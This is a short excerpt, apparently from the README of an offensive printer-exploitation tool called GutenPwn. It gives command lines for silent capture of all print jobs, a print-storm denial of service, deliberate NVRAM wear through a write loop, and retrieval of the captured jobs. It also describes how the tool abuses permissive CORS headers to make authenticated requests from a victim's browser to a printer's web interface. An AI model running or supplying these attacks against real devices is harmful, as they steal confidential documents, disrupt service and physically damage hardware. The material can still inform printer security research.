...
python gpwn.py 192.168.1.100 --xsp info

# Job capture — silently capture all print jobs going forward
python gpwn.py 192.168.1.100 --xsp capture

# DoS — print storm (resource exhaustion)
python gpwn.py 192.168.1.100 --xsp dos

# NVRAM damage (physical wear via write loop)
python gpwn.py 192.168.1.100 --xsp nvram

# Retrieve previously captured jobs
python gpwn.py 192.168.1.100 --xsp exfil
...
Some printer EWS interfaces respond to cross-origin requests with overly permissive CORS headers (`Access-Control-Allow-Origin: *`). GutenPwn's XSP module exploits this to make authenticated API calls from the victim's browser to the printer's web interface:
